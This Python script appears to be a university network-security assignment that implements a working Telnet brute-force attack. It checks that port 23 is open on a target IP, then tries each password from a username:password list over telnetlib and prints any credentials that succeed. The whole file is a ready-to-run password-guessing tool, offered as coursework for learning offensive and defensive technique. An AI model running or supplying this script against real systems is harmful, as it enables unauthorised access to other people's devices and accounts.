"""
Python Version 3.8

Singapore Institute of Technology (SIT)
Information and Communications Technology (Information Security), BEng (Hons)

ICT-2203 Network Security Assignment 1

Author: @ Gerald Peh / 1802959
Academic Year: 2020/2021
Lecturer: Dr. Woo Wing Keong
Submission Date: 25th October 2020

This script holds the code to perform Telnet Bruteforce.
"""

import sys
import time
import telnetlib
from os import path
from timeit import default_timer as timer
from socket import socket, inet_aton, gaierror, AF_INET, SOCK_STREAM, error


def port_is_alive(target, port):
    """
    Checks if the target address and port is open

    :param target: String containing target IP address
    :param port: Integer containing target port number
    :return: Boolean True if port is open, False otherwise
    """
    a_socket = socket(AF_INET, SOCK_STREAM)
    a_socket.settimeout(2)

    location = (target, port)
    try:
        result_of_check = a_socket.connect_ex(location)
    except gaierror:
        return False
    a_socket.close()

    if result_of_check == 0:
        return True
    else:
        return False


def valid_ip(ip_addr):
    """
    Checks if an IP address is valid_ip

    :param ip_addr: String containing IP address
    :return: Boolean True if valid, False otherwise
    """
    try:
        inet_aton(ip_addr)
        return True

    except error:
        return False

def telnet_bruteforce(host, credentials_filepath):
    """
    Bruteforces a Telnet service

    :param host: Host Address
    :param credentials_filepath: String containing 1 line of username and password in the format <username>:<password>
    :return: Boolean Returns True if successful
    """
    credentials_found = False
    # Start timer
    start = timer()
    counter = 0

    for line in [line.strip() for line in open(credentials_filepath)]:
        time.sleep(0.5)

        user, password = line.split(":")

        tn = telnetlib.Telnet(host)

        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")

        n, match, previous = tn.expect([b"\r\nPassword:"], 1)
        counter += 1

        print("[" + str(counter) + "] Trying " + user + ":" + password)

        if not match:
            credentials_found = True
            print("\n[*] Credentials found!")
            print("[*] Username: " + user)
            print("[*] Password: " + password)
            break
        else:
            continue

    if not credentials_found:
        print("[*] No credentials successful")

    # Stop timer & calculate time elapsed
    end = timer()
    elapsed = end - start
    print("[*] Time: " + str(elapsed))
    sys.exit()


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("[*] Usage: python telnet_bruteforce.py <TARGET IPADDR> <PASSWORD_LIST FILEPATH>")
        # print("[*] Version: Python > 2.7 ")
        print("[*] Filepath: File path to password list")
        sys.exit()

    target = sys.argv[1]
    credentials_filepath = sys.argv[2]
    cleared_to_run = True

    # Checks for invalid IP addresses
    if not valid_ip(target):
        print("[!] Invalid IP address")
        cleared_to_run = False

    # Port 23 to check for telnet services
    if not port_is_alive(target, 23):
        print("[!] Port 23 is not open, Telnet services cannot be detected on target")
        cleared_to_run = False

    # Checks if given password list exists
    if not path.exists(credentials_filepath):
        print("[!] Credentials list [{}] does not exist".format(credentials_filepath))
        cleared_to_run = False

    # If any checks are unsuccessful, program will not run
    if not cleared_to_run:
        sys.exit()

    print("[*] Running Telnet Bruteforce script on target [{}]".format(target))
    print("[*] Using credential list [{}]".format(credentials_filepath))

    telnet_bruteforce(target, credentials_filepath)